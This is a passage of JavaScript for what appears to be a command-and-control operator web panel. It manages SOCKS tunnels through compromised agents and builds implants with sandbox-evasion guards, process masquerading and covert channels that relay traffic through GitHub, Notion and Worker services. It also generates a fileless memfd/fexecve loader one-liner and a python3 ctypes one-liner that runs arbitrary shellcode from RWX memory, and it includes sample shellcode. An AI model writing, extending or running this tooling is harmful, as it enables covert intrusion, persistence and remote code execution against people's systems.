  const sEl = document.getElementById("stow-socks");
  if (lEl) lEl.value = d.listen || "9998";
  if (sEl) sEl.value = d.socks  || "1080";
  const secEl = document.getElementById("stow-secret-show");
  if (secEl) {
    secEl.textContent = d.secret_set
      ? (`已设置 ·••••${d.secret_hint || ""}`)
      : "(未设置)";
    secEl.onclick = () => toast("隧道 Secret 请在 Settings 填写，此处不回显", "info");
  }
  const su = document.getElementById("stow-socks-user");
  const sp = document.getElementById("stow-socks-pass");
  if (su) su.textContent = d.socks_user || "s5admin";
  if (sp) sp.textContent = d.socks_pass || "123456";
  const binEl = document.getElementById("stow-bin-path");
  if (binEl) binEl.textContent = d.binary || "";
  const missingEl = document.getElementById("stow-bin-missing");
  if (missingEl) missingEl.style.display = d.has_bin ? "none" : "inline";
  // Kick off status poll
  stowRefreshStatus();
}

async function stowSaveConfig() {
  const listen = document.getElementById("stow-listen")?.value?.trim() || "9998";
  const socks  = document.getElementById("stow-socks")?.value?.trim()  || "1080";
  const r = await fetch("/api/tunnel/admin/config", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ listen, socks }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { toast(d.error || "Save failed", "error"); return false; }
  toast(d.message || "Admin config saved", d.stale ? "warning" : "success");
  return true;
}

async function stowStart() {
  await stowSaveConfig();
  const r = await fetch("/api/tunnel/admin/start", { method: "POST" });
  const d = await r.json().catch(() => ({}));
  if (r.ok) {
    toast(d.message || "Admin started", "success");
    stowRefreshStatus();
  } else {
    toast(d.error || "Start failed", "error");
  }
}

async function stowStop() {
  const r = await fetch("/api/tunnel/admin/stop", { method: "POST" });
  const d = await r.json().catch(() => ({}));
  toast(d.message || (r.ok ? "Stopped" : "Failed"), r.ok ? "warning" : "error");
  stowRefreshStatus();
}

async function stowRefreshStatus() {
  const r = await fetch("/api/tunnel/admin/status").catch(() => null);
  if (!r || !r.ok) return;
  const d = await r.json();

  const badge = document.getElementById("stow-badge");
  const info  = document.getElementById("stow-server-info");
  const tmuxBar = document.getElementById("stow-tmux-bar");
  const tmuxName = document.getElementById("stow-tmux-name");
  const tmuxAttach = document.getElementById("stow-tmux-attach");

  if (badge) {
    if (d.running) {
      badge.textContent = "● Running";
      badge.className = "shell-badge shell-running";
    } else {
      badge.textContent = "● Stopped";
      badge.className = "shell-badge shell-stopped";
    }
  }
  if (info) {
    if (d.running && d.uptime_secs != null) {
      const h = Math.floor(d.uptime_secs / 3600);
      const m = Math.floor((d.uptime_secs % 3600) / 60);
      const s = d.uptime_secs % 60;
      const up = h > 0 ? `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`
                       : `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
      const lp = d.live_listen || d.listen_port;
      const sp = d.live_socks || d.socks_port;
      info.textContent = `listen :${lp} · socks5 :${sp} · up ${up}`
        + (d.stale ? " · 配置已改，点 Start 生效" : "");
    } else {
      info.textContent = "";
    }
  }
  if (tmuxBar) {
    if (d.running && d.tmux_session) {
      tmuxBar.style.display = "flex";
      if (tmuxName)   tmuxName.textContent   = d.tmux_session;
      if (tmuxAttach) tmuxAttach.textContent = d.tmux_attach || "";
    } else {
      tmuxBar.style.display = "none";
    }
  }
}

async function saveTunnelConfig() {
  const r = await fetch("/api/tunnel/config", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({
      tunnel_ip:     document.getElementById("tn-ip").value,
      tunnel_port:   document.getElementById("tn-port").value,
      tunnel_secret: document.getElementById("tn-secret").value,
    }),
  });
  if (!r.ok) {
    const d = await r.json().catch(() => ({}));
    toast(d.error || "Tunnel config save failed", "error");
    return false;
  }
  toast("Tunnel config saved", "success");
  return true;
}

async function tunnelAction(action) {
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  if (!await saveTunnelConfig()) return;
  const r = await fetch(`/api/tunnel/${action}`, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ agent_id: S.selectedAgent.id }),
  });
  if (r.ok) {
    toast(`Tunnel ${action} 已下发，等 Agent 回显 / 隧道状态变绿`, "success");
    switchTab("terminal");
  } else {
    const d = await r.json().catch(() => ({}));
    toast(d.error || `Tunnel ${action} failed`, "error");
  }
}

// ── Settings ───────────────────────────────────────────────────────────────

let _repos = [];
let _settingsReady = false;
let _tokenItems = [];   // {hint, full|null} — full only for newly typed tokens
let _tokenCountAtLoad = 0;
let _notionTokenSet = false;
let _notionDBs = [];

// ── Audit log ────────────────────────────────────────────────────────────────

async function loadAudit() {
  const tbody = document.getElementById("audit-tbody");
  if (!tbody) return;
  try {
    const r = await fetch("/api/audit?limit=200");
    const d = await r.json();
    const entries = d.entries || [];
    if (!entries.length) {
      tbody.innerHTML = `<tr><td colspan="5" style="padding:10px;opacity:.6">No audit entries yet</td></tr>`;
      return;
    }
    tbody.innerHTML = entries.map(e => `
      <tr style="border-top:1px solid var(--border,#333a52)">
        <td style="padding:4px 8px;white-space:nowrap;opacity:.8">${esc(e.ts || "")}</td>
        <td style="padding:4px 8px">${esc(e.operator || "—")}</td>
        <td style="padding:4px 8px"><code>${esc(e.action || "")}</code></td>
        <td style="padding:4px 8px">${esc(e.agent_id || "")}</td>
        <td style="padding:4px 8px;max-width:420px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(e.detail || "")}">${esc(e.detail || "")}</td>
      </tr>`).join("");
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="5" style="padding:10px;color:#e74c3c">Failed to load audit log</td></tr>`;
  }
}

// ── Builder ──────────────────────────────────────────────────────────────────

let _bldPollTimer = null;
let _builderReady = false;

async function onBuilderTab() {
  _builderReady = false;
  const r = await fetch("/api/builder/config").catch(() => null);
  if (!r || !r.ok) return;
  const d = await r.json();
  const set = (id, key) => { const el = document.getElementById(id); if (el) el.value = d[key] || ""; };
  // Shared fields (channel-independent)
  set("bld-path",     "builder_deploy_path");
  // 密码不回填明文；留空保存=沿用库里已有编包密码（后端空不覆盖）。
  {
    const el = document.getElementById("bld-password");
    if (el) {
      el.value = "";
      el.placeholder = d.builder_password_set
        ? "已保存，留空=沿用部署/Settings 里的通信 Secret；填 - 清空"
        : "未设置：请先在部署时填写，或到 Settings 设一次";
    }
  }
  set("bld-backup",   "builder_backup_url");
  set("bld-worker-urls",   "builder_worker_urls");
  {
    const el = document.getElementById("bld-worker-secret");
    if (el) {
      el.value = "";
      el.placeholder = d.builder_worker_secret_set ? "已保存，留空=沿用" : "中继共享密钥";
    }
  }
  set("bld-worker-path",   "builder_worker_path");
  set("bld-poll",     "builder_poll_interval");
  set("bld-window",   "builder_time_window");
  set("bld-g-host",   "builder_guard_hostname");
  set("bld-g-user",   "builder_guard_username");
  set("bld-g-file",   "builder_guard_file");
  set("bld-g-mem",    "builder_guard_memory");
  set("bld-proc-name", "builder_proc_name");
  set("bld-proc-path", "builder_proc_path");
  const dbgEl = document.getElementById("bld-debug");
  if (dbgEl) dbgEl.value = d.builder_debug === "1" ? "1" : "0";
  // Architecture triple (项 10 多架构；空=默认 musl 单架构)
  const archEl = document.getElementById("bld-arch");
  if (archEl && d.builder_arch) archEl.value = d.builder_arch;
  // Release 标识 + 双通道故障切换参数（项 9 / 项 2 控制面板）
  set("bld-release",     "builder_release");
  set("bld-fo-threshold", "builder_failover_threshold");
  set("bld-fo-probe",     "builder_probe_after_oks");
  // Channel selection
  const chEl = document.getElementById("bld-channel");
  if (chEl) chEl.value = d.builder_channel || "github";
  // Load per-channel token/repo + labels.
  // NOTE: call bldChannelChange() (labels + _bldApplyChannel), NOT
  // _bldApplyChannel() directly — and _bldApplyChannel() must never call
  // bldChannelChange() back: that mutual recursion overflowed the stack on
  // every Builder tab open / channel dropdown change.
  _bldAllConfig = d;  // cache all config for channel switching
  bldChannelChange();
  bldRefreshStatus();
  _builderReady = true;
}

let _bldAllConfig = {};

function _bldApplyChannel() {
  const ch = document.getElementById("bld-channel")?.value || "github";
  const prefix = ch === "notion" ? "builder_notion_" : "builder_github_";
  const tInput = document.getElementById("bld-token");
  const rInput = document.getElementById("bld-repo");
  if (tInput) {
    tInput.value = "";
    const isSet = !!_bldAllConfig[prefix + "token_set"];
    tInput.placeholder = isSet
      ? "已保存，留空=沿用"
      : (ch === "notion" ? "ntn_xxxx" : "ghp_xxxx");
  }
  if (rInput) rInput.value = _bldAllConfig[prefix + "repo"]  || "";
  if (rInput && !rInput.value) rInput.value = _bldAllConfig["builder_repo"]  || "";
}

function bldChannelChange() {
  const ch = document.getElementById("bld-channel")?.value || "github";
  const tLabel = document.getElementById("bld-token-label");
  const rLabel = document.getElementById("bld-repo-label");
  const tInput = document.getElementById("bld-token");
  const rInput = document.getElementById("bld-repo");
  const ghGroup = document.getElementById("bld-token-repo-group");
  const wkGroup = document.getElementById("bld-worker-group");
  const foGroup = document.getElementById("bld-fo-group");
  const wkUrlLabel = document.getElementById("bld-worker-urls-label");
  const hint = document.getElementById("bld-channel-hint");

  // 四档：GitHub / Notion / Worker 单通道 + 双通道（Worker 主 + GitHub 备）
  const showGh = (ch === "github" || ch === "dual" || ch === "notion");
  const showWk = (ch === "worker" || ch === "dual");
  const showFo = (ch === "dual");
  if (ghGroup) ghGroup.style.display = showGh ? "contents" : "none";
  if (wkGroup) wkGroup.style.display = showWk ? "contents" : "none";
  if (foGroup) foGroup.style.display = showFo ? "contents" : "none";
  if (wkUrlLabel) wkUrlLabel.textContent = (ch === "worker") ? "Worker URLs:" : "Worker 主 URLs:";

  if (ch === "notion") {
    if (tLabel) tLabel.textContent = "Notion Token:";
    if (rLabel) rLabel.textContent = "Database ID:";
    if (tInput) tInput.placeholder = "ntn_xxxx";
    if (rInput) rInput.placeholder = "database-uuid";
    if (hint) hint.innerHTML = "📓 Notion 单通道：没有备用通道。Token=Integration Token（ntn_ 开头），Repo=Database ID。通信 Secret 部署时写过就不用再填。";
  } else if (ch === "worker") {
    if (hint) hint.innerHTML = "☁️ Worker 单通道：只需 Relay URLs + Secret + Path。通信 Secret 部署时写过就不用再填。（要 GitHub 备用请选🔀双通道）";
  } else if (ch === "dual") {
    if (tLabel) tLabel.textContent = "GitHub Token (备用):";
    if (rLabel) rLabel.textContent = "Repo (备用, owner/repo):";
    if (tInput) tInput.placeholder = "ghp_xxxx";
    if (rInput) rInput.placeholder = "owner/repo";
    if (hint) hint.innerHTML = "🔀 双通道：<b>Worker 主 + GitHub 备</b>。Worker 三件套必填（或库里已有）；GitHub Token/Repo 是中继故障时的备用凭据。主通道连续失败自动切 GitHub，恢复后自动切回并通知。通信 Secret 部署时写过就不用再填。";
  } else {
    if (tLabel) tLabel.textContent = "GitHub Token:";
    if (rLabel) rLabel.textContent = "Repo (owner/repo):";
    if (tInput) tInput.placeholder = "ghp_xxxx";
    if (rInput) rInput.placeholder = "owner/repo";
    if (hint) hint.innerHTML = "🐙 GitHub 单通道：不编入 Worker 备用。即使库里有残留的中继配置，这次编包也不会带上。通信 Secret 部署时写过就不用再填。";
  }
  // Swap in the saved values for the newly selected channel
  if (_bldAllConfig && Object.keys(_bldAllConfig).length > 0) {
    _bldApplyChannel();
  }
}

async function bldSave() {
  if (!_builderReady) {
    toast("Builder 尚未加载完，请稍后再保存（避免把渠道写成默认的 GitHub 单通道）", "error");
    return false;
  }
  const g = id => document.getElementById(id)?.value?.trim() || "";
  const ch = g("bld-channel") || "github";
  const prefix = ch === "notion" ? "builder_notion_" : "builder_github_";
  const body = {
    builder_channel:        ch,
    builder_deploy_path:    g("bld-path"),
    // Save token/repo under channel-specific keys
    [prefix + "token"]:     g("bld-token"),
    [prefix + "repo"]:      g("bld-repo"),
    // Also save as the "active" builder_token/repo (used by Build)
    builder_token:          g("bld-token"),
    builder_repo:           g("bld-repo"),
    builder_password:       g("bld-password"),
    builder_backup_url:     g("bld-backup"),
    builder_worker_urls:    g("bld-worker-urls"),
    builder_worker_secret:  g("bld-worker-secret"),
    builder_worker_path:    g("bld-worker-path"),
    builder_poll_interval:  g("bld-poll"),
    builder_time_window:    g("bld-window"),
    builder_debug:          g("bld-debug"),
    builder_guard_hostname: g("bld-g-host"),
    builder_guard_username: g("bld-g-user"),
    builder_proc_name:      g("bld-proc-name"),
    builder_proc_path:      g("bld-proc-path"),
    builder_guard_file:     g("bld-g-file"),
    builder_guard_memory:   g("bld-g-mem"),
    builder_arch:           g("bld-arch"),
    builder_release:        g("bld-release"),
    builder_failover_threshold: g("bld-fo-threshold"),
    builder_probe_after_oks:     g("bld-fo-probe"),
  };
  const r = await fetch("/api/builder/config", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) {
    toast(d.error || "Save failed", "error");
    return false;
  }
  toast(d.github_repo_synced
    ? "已保存，并把备用仓库加入了 Settings 扫描列表"
    : "Builder config saved", "success");
  const cfgR = await fetch("/api/builder/config").catch(() => null);
  if (cfgR && cfgR.ok) {
    _bldAllConfig = await cfgR.json();
    bldChannelChange();
  }
  return true;
}

async function bldBuild() {
  if (!await bldSave()) return;
  const compress = document.getElementById("bld-compress")?.checked || false;
  const r = await fetch("/api/builder/build", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ compress }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { toast(d.error || "Build failed to start", "error"); return; }
  toast("Build started — compiling agent...", "info");
  document.getElementById("bld-output").textContent = "Compiling...\n";
  document.getElementById("bld-result").style.display = "none";
  // Start polling build status
  if (_bldPollTimer) clearInterval(_bldPollTimer);
  _bldPollTimer = setInterval(bldRefreshStatus, 3000);
}

let _bldStatusFails = 0;
async function bldRefreshStatus() {
  const r = await fetch("/api/builder/status").catch(() => null);
  if (!r || !r.ok) {
    _bldStatusFails += 1;
    if (_bldStatusFails === 3) {
      toast("编包状态连续拉失败，编译可能还在跑，也可能会话已断。请看日志或重新登录。", "error");
    }
    return;
  }
  _bldStatusFails = 0;
  const d = await r.json();
  const badge = document.getElementById("bld-status-badge");
  const elapsed = document.getElementById("bld-elapsed");
  const output = document.getElementById("bld-output");
  const result = document.getElementById("bld-result");
  const info   = document.getElementById("bld-result-info");
  const dlBtn  = document.getElementById("bld-download-btn");

  if (d.building) {
    // Extract latest [stage] marker from output for display
    let stage = "compiling";
    const stageMatch = (d.output || "").match(/\[stage\] ([^\n]+)/g);
    if (stageMatch) stage = stageMatch[stageMatch.length - 1].replace("[stage] ", "");
    if (badge) {
      badge.textContent = `● ${stage}`;
      badge.style.cssText = "font-size:12px;font-weight:600;padding:3px 10px;border-radius:12px;background:#1a3a5a;border:1px solid var(--accent);color:var(--accent)";
    }
    if (elapsed) elapsed.textContent = `${d.elapsed}s`;
  } else {
    if (_bldPollTimer) { clearInterval(_bldPollTimer); _bldPollTimer = null; }

    if (d.exit_code === 0 && d.build_ok) {
      if (badge) {
        badge.textContent = "✓ Success";
        badge.style.cssText = "font-size:12px;font-weight:600;padding:3px 10px;border-radius:12px;background:#1a4a1a;border:1px solid var(--green);color:var(--green)";
      }
    } else if (d.exit_code !== null) {
      if (badge) {
        badge.textContent = "✕ Failed";
        badge.style.cssText = "font-size:12px;font-weight:600;padding:3px 10px;border-radius:12px;background:#4a1a1a;border:1px solid var(--red);color:var(--red)";
      }
    } else {
      if (badge) {
        badge.textContent = "Idle";
        badge.style.cssText = "font-size:12px;font-weight:600;padding:3px 10px;border-radius:12px;background:var(--bg-2);border:1px solid var(--border);color:var(--text-muted)";
      }
    }
    if (elapsed) elapsed.textContent = d.elapsed ? `${d.elapsed}s` : "";
  }

  if (d.output) output.textContent = d.output;

  // Show result section if binary exists
  if (d.bin_exists && result && info) {
    result.style.display = "block";
    const sizeKB = d.bin_size ? (d.bin_size / 1024).toFixed(0) + " KB" : "?";
    const sizeMB = d.bin_size ? (d.bin_size / 1048576).toFixed(1) + " MB" : "";
    info.innerHTML = `
      <div>Path: <code style="font-size:10px">${esc(d.bin_path)}</code></div>
      <div>Size: ${sizeKB} (${sizeMB})</div>
      <div>Modified: ${d.bin_time || "?"}</div>
      <div>Status: ${d.build_ok ? '<span style="color:var(--green)">✓ Fresh build</span>' : '<span style="color:var(--text-muted)">Previous build</span>'}</div>
    `;
    if (dlBtn) dlBtn.style.display = "inline-block";
  }
}

function bldDownload() {
  window.location.href = "/api/builder/download";
}

// ── Shellcode mode (fileless, Linux) ─────────────────────────────────────────

function bldCopyText(id) {
  const el = document.getElementById(id);
  if (!el) return;
  const text = el.value;
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).catch(() => {
      el.select(); document.execCommand("copy");
    });
  } else {
    el.select(); document.execCommand("copy");
  }
  const btn = document.getElementById(id + "-copy");
  if (btn) { const old = btn.textContent; btn.textContent = "✅ 已复制"; setTimeout(() => btn.textContent = old, 1200); }
}

// Mode A — agent fileless deploy: server mints a tokened fetch URL and wraps
// it in a memfd_create + fexecve one-liner.
async function bldFilelessGen() {
  const info = document.getElementById("bld-fileless-info");
  const cmd  = document.getElementById("bld-fileless-cmd");
  const copy = document.getElementById("bld-fileless-copy");
  if (info) info.textContent = "generating…";
  const r = await fetch("/api/builder/fileless", { method: "POST" }).catch(() => null);
  if (!r || !r.ok) {
    const d = r ? await r.json().catch(() => ({})) : {};
    if (info) info.textContent = "❌ " + (d.error || "request failed");
    return;
  }
  const d = await r.json();
  if (cmd) { cmd.value = d.cmd; cmd.style.display = "block"; }
  if (copy) copy.style.display = "inline-block";
  if (info) {
    const mb = (d.size / 1048576).toFixed(1);
    info.textContent = `✓ ${mb} MB · 令牌 ${d.ttl_hours}h 内有效`;
  }
}

// Shellcode input parser: \xNN form / pure hex / base64 → Uint8Array
function bldParseShellcode(text) {
  const t = (text || "").trim();
  if (!t) return null;
  if (/\\x[0-9a-fA-F]{2}/.test(t)) {
    const pairs = t.match(/\\x([0-9a-fA-F]{2})/g) || [];
    if (!pairs.length) return null;
    return new Uint8Array(pairs.map(s => parseInt(s.slice(2), 16)));
  }
  const hex = t.replace(/(0x|[^0-9a-fA-F])/g, "");
  if (hex.length >= 2 && hex.length % 2 === 0 && /^[0-9a-fA-F]+$/.test(hex)) {
    const out = new Uint8Array(hex.length / 2);
    for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.substr(i * 2, 2), 16);
    return out;
  }
  try {
    const bin = atob(t.replace(/\s+/g, ""));
    if (bin.length) return new Uint8Array([...bin].map(c => c.charCodeAt(0)));
  } catch {}
  return null;
}

// Mode B — raw shellcode one-liner: mmap RWX + memcpy + jump
// (same technique as grisuno/ejecutarShellcode, via python3 ctypes).
function bldScGen() {
  const input = document.getElementById("bld-sc-input");
  const info  = document.getElementById("bld-sc-info");
  const cmd   = document.getElementById("bld-sc-cmd");
  const copy  = document.getElementById("bld-sc-copy");
  const bytes = bldParseShellcode(input ? input.value : "");
  if (!bytes || !bytes.length) {
    if (info) info.textContent = "❌ 无法解析（支持 \\xNN / hex / base64）";
    return;
  }
  if (bytes.length > 1024 * 1024) {
    if (info) info.textContent = "❌ 过大（>1MB）— shellcode 应为几百字节";
    return;
  }
  let b64 = "";
  const CH = 0x8000;
  for (let i = 0; i < bytes.length; i += CH)
    b64 += String.fromCharCode.apply(null, bytes.subarray(i, i + CH));
  b64 = btoa(b64);
  cmd.value = (
    'python3 -c "import ctypes,base64; l=ctypes.CDLL(None,use_errno=True); ' +
    'l.mmap.restype=ctypes.c_void_p; ' +
    "s=base64.b64decode('" + b64 + "'); " +
    'm=l.mmap(0,len(s),7,0x22,-1,0); ' +
    'ctypes.memmove(m,s,len(s)); ' +
    'ctypes.CFUNCTYPE(None)(m)()"'
  );
  cmd.style.display = "block";
  if (copy) copy.style.display = "inline-block";
  if (info) info.textContent = `✓ ${bytes.length} 字节 shellcode`;
}

// Harmless demo: build "PWNED\n" on the stack, write(1, rsp, 6), exit(0).
// x86_64, 43 bytes — verified in the lab (stack-based buffer, not movabs-as-pointer).
function bldScDemo() {
  const input = document.getElementById("bld-sc-input");
  if (input) input.value =
    "\\x48\\xb8\\x50\\x57\\x4e\\x45\\x44\\x0a\\x00\\x00" +  // movabs rax,"PWNED\\n"
    "\\x50" +                                             // push rax
    "\\x48\\x89\\xe6" +                                   // mov rsi,rsp
    "\\xbf\\x01\\x00\\x00\\x00" +                         // mov edi,1
    "\\xba\\x06\\x00\\x00\\x00" +                         // mov edx,6
    "\\xb8\\x01\\x00\\x00\\x00" +                         // mov eax,1 (SYS_write)
    "\\x0f\\x05" +                                        // syscall
    "\\xbf\\x00\\x00\\x00\\x00" +                         // mov edi,0
    "\\xb8\\x3c\\x00\\x00\\x00" +                         // mov eax,60 (SYS_exit)
    "\\x0f\\x05";                                         // syscall
}

// ── Settings ──────────────────────────────────────────────────────────────────

async function loadSettings() {
  _settingsReady = false;
  const r = await fetch("/api/settings");
  if (!r.ok) return;
  const d = await r.json();
  {
    const el = document.getElementById("s-password");
    if (el) {
      el.value = "";
      el.placeholder = d.password_set ? "已设置，留空=沿用；填 - 清空" : "解密 Agent 回包 / 加密下发指令";
    }
  }
  document.getElementById("s-poll").value     = d.poll_interval || 30;
  document.getElementById("s-limit").value    = (d.issue_limit === 0 || d.issue_limit) ? d.issue_limit : 50;
  document.getElementById("s-webpwd").value   = "";
  { const cur = document.getElementById("s-web-current");
    if (cur) cur.textContent = d.web_username
      ? `当前登录用户：${d.web_username}（密码已设置，不回显）`
      : "当前登录：未设置";}
  { const ap = document.getElementById("s-always-poll");
    if (ap) ap.textContent = d.always_poll
      ? "后台持续扫描：已开启（C2_ALWAYS_POLL=1）。浏览器关掉也不会停扫。"
      : "后台持续扫描：未开 C2_ALWAYS_POLL。本页开着（SSE 连着）会继续扫；关掉浏览器约 90 秒后停扫。实验室建议部署时打开 C2_ALWAYS_POLL=1。";}
  { const st = document.getElementById("s-stale");
    if (st) st.value = d.stale_days || 7;}
  { const wu = document.getElementById("s-worker-urls");
    const ws = document.getElementById("s-worker-secret");
    const wp = document.getElementById("s-worker-path");
    if (wu) wu.value = d.worker_urls || "";
    if (ws) {
      ws.value = "";
      ws.placeholder = d.worker_secret_set ? "已设置，留空=沿用" : "中继共享密钥";
    }
    if (wp) wp.value = d.worker_path || "";}
  document.getElementById("s-webuser").value  = d.web_username || "";
  _repos = d.github_repos || [];
  renderRepos();
  // Tokens: GET 不再回传全文，只用 last-4 提示；新加的才带 full
  _tokenItems = (d.github_token_hints || []).map((h, i) => ({hint: h, full: null, idx: i}));
  _tokenCountAtLoad = d.github_token_count || _tokenItems.length;
  renderTokens();
  _notionTokenSet = !!d.notion_token_set;
  const nEl = document.getElementById("s-notion-token");
  if (nEl) {
    nEl.value = "";
    nEl.placeholder = _notionTokenSet ? "已设置，留空=沿用；填 - 清空" : "ntn_… (Internal Integration Token)";
  }
  _notionDBs = d.notion_databases || [];
  renderNotionDBs();
  {
    const el = document.getElementById("settings-status");
    if (el && d.worker_discovery_blocked) {
      el.style.color = "var(--red)";
      el.textContent = "⚠ Worker 已配置但控制器解密密码为空：主通道（Worker）发现已跳过，双通道无法合流。请填写解密密码。";
    } else if (el && d.github_token_from_builder) {
      el.style.color = "var(--accent)";
      el.textContent = "ℹ Settings 未填 GitHub Token，扫描备用通道时沿用了 Builder 的 PAT。建议在 Settings 也填一份。";
    } else if (el && d.github_repos_from_builder) {
      el.style.color = "var(--accent)";
      el.textContent = "ℹ Builder 的备用仓库尚未写入 Settings 列表，后台已按该仓库扫描。保存 Builder 或点「保存并连接」会自动补上。";
    }
  }
  // WS Shell controller address (persisted across sessions)
  const ipEl   = document.getElementById("wsshell-ip");
  const portEl = document.getElementById("wsshell-port");
  if (ipEl   && d.wspty_host) ipEl.value   = d.wspty_host;
  if (portEl && d.wspty_port) portEl.value = d.wspty_port || "7337";
  _fillUpgradeFields(d);
  _settingsReady = true;
}

function _fillUpgradeFields(d) {
  const upgUrl    = document.getElementById("upg-url");
  const upgDest   = document.getElementById("upg-dest-path");
  const upgManual = document.getElementById("upg-manual-path");
  if (upgUrl    && d.upgrade_url)          upgUrl.value    = d.upgrade_url;
  if (upgDest   && d.upgrade_dest)         upgDest.value   = d.upgrade_dest;
  if (upgManual && d.upgrade_manual_path)  upgManual.value = d.upgrade_manual_path;
}

async function loadUpgradeFields() {
  try {
    const r = await fetch("/api/settings");
    if (!r.ok) return;
    _fillUpgradeFields(await r.json());
  } catch (_) {}
}

function renderTokens() {
  const el = document.getElementById("s-tokens-list");
  if (!el) return;
  el.innerHTML = _tokenItems.map((t, i) => {
    const masked = t.full
      ? (t.full.length > 10 ? t.full.slice(0, 6) + "..." + t.full.slice(-4) : t.full)
      : ("••••" + (t.hint || ""));
    return `<span class="repo-item">${esc(masked)}
      <button onclick="removeToken(${i})" title="Remove">✕</button></span>`;
  }).join("");
}
function addToken() {
  const inp = document.getElementById("s-token-input");
  const val = inp.value.trim();
  if (!val) return;
  if (_tokenItems.some(t => t.full === val)) { toast("Already added", "info"); inp.value = ""; return; }
  _tokenItems.push({hint: val.slice(-4), full: val});
  renderTokens(); inp.value = "";
}
function removeToken(i) { _tokenItems.splice(i, 1); renderTokens(); }

function renderNotionDBs() {
  const el = document.getElementById("s-ndb-list");
  if (!el) return;
  el.innerHTML = _notionDBs.map((d, i) => {
    const short = d.length > 16 ? d.slice(0, 8) + "..." + d.slice(-4) : d;
    return `<span class="repo-item">${esc(short)}<button onclick="removeNotionDB(${i})" title="Remove">✕</button></span>`;
  }).join("");
}
function addNotionDB() {
  const inp = document.getElementById("s-ndb-input");
  const val = inp.value.trim();
  if (!val || val.length < 10) { toast("Enter a valid database ID", "error"); return; }
  if (_notionDBs.includes(val)) { toast("Already added", "info"); inp.value = ""; return; }
  _notionDBs.push(val); renderNotionDBs(); inp.value = "";
}
function removeNotionDB(i) { _notionDBs.splice(i, 1); renderNotionDBs(); }

async function setupNotionDBs() {
  const nToken = document.getElementById("s-notion-token")?.value?.trim();
  if (!nToken && !_notionTokenSet) { toast("Fill in Notion Token first", "error"); return; }
  if (!_notionDBs.length) { toast("Add at least one Database ID first", "error"); return; }

  // Save settings first so server has the latest token + DB list
  if (!await saveSettings()) return;

  toast("Checking & setting up database columns...", "info");
  const r = await fetch("/api/notion/setup_database", { method: "POST" });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) {
    toast(d.error || "Setup failed", "error");
    return;
  }

  // Show results
  const msgs = (d.results || []).join("\n");
  toast("Setup complete", "success");
  alert("Database setup results:\n\n" + msgs);
}

function renderRepos() {
  document.getElementById("s-repos-list").innerHTML =
    _repos.map(r => `
      <span class="repo-item">
        ${esc(r)}
        <button onclick="removeRepo('${esc(r)}')" title="Remove">✕</button>
      </span>`).join("");
}

function addRepo() {
  const inp = document.getElementById("s-repo-input");
  const val = inp.value.trim();
  if (!val || !val.includes("/")) { toast("Format: owner/repo", "error"); return; }
  if (!_repos.includes(val)) { _repos.push(val); renderRepos(); }
  inp.value = "";
}

function removeRepo(r) { _repos = _repos.filter(x => x !== r); renderRepos(); }


async function saveSettings() {
  if (!_settingsReady) {
    toast("设置尚未加载完，请稍后再保存（避免把仓库列表写成空）", "error");
    return false;
  }
  const addToks = _tokenItems.filter(t => t.full).map(t => t.full);
  const payload = {
    password:          document.getElementById("s-password").value,
    github_repos:      _repos,
    poll_interval:     parseInt(document.getElementById("s-poll").value, 10) || 30,
    issue_limit:       (() => {
      const n = parseInt(document.getElementById("s-limit").value, 10);
      return Number.isFinite(n) ? n : 50;
    })(),
    stale_days:        parseInt(document.getElementById("s-stale")?.value || "7", 10) || 7,
    notion_databases:  _notionDBs,
    worker_urls:       document.getElementById("s-worker-urls")?.value.trim() || "",
    worker_secret:     document.getElementById("s-worker-secret")?.value || "",
    worker_path:       document.getElementById("s-worker-path")?.value.trim() || "",
  };
  const keepIdx = _tokenItems.filter(t => !t.full && t.idx != null).map(t => t.idx);
  if (!_tokenItems.length && _tokenCountAtLoad > 0) {
    payload.github_token = "-";
  } else if (addToks.length || keepIdx.length !== _tokenCountAtLoad) {
    payload.github_token_keep_indices = keepIdx;
    payload.github_token_add = addToks;
  }
  const nTok = document.getElementById("s-notion-token").value.trim();
  if (nTok) payload.notion_token = nTok;
  const pwd  = document.getElementById("s-webpwd").value;
  const user = document.getElementById("s-webuser").value.trim();
  if (pwd)  payload.web_password = pwd;
  if (user) payload.web_username = user;

  const r = await fetch("/api/settings", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(payload),
  });
  if (r.ok) {
    const el = document.getElementById("settings-status");
    el.style.color  = "var(--green)";
    el.textContent  = "✓ Saved. Refreshing agents…";
    toast("Settings saved", "success");
    await loadSettings();
    const blocked = el && (el.textContent || "").includes("Worker 已配置");
    await refreshAgents();
    if (el && blocked) {
      el.style.color = "var(--red)";
      el.textContent = "⚠ Worker 已配置但控制器解密密码为空：主通道（Worker）发现已跳过，双通道无法合流。请填写解密密码。";
    } else if (el) {
      el.textContent = "✓ Saved.";
    }
  } else {
    toast("Save failed", "error");
  }
  return r.ok;
}

// ── Agent refresh & cleanup ────────────────────────────────────────────────

async function refreshAgents() {
  const btn = document.getElementById
    ? document.querySelector('[onclick="refreshAgents()"]') : null;
  if (btn) { btn.disabled = true; btn.textContent = "🔄 刷新中…"; }
  S.agentsLoading = true;
  renderAgents();   // skeleton while the refresh round-trips
  try {
    const r = await fetch("/api/agents/refresh", { method: "POST" });
    const d = await r.json();
    S.agents = d.agents || [];
    _rebindSelectedAgent(S.agents);
    S.agentsLoading = false;
    renderAgents();
    loadStats();
    if ((d.warnings || []).includes("worker_discovery_skipped_no_c2_password")) {
      toast("Worker 已配但解密密码为空，主通道发现已跳过。请到 Settings 填写控制器解密密码。", "error");
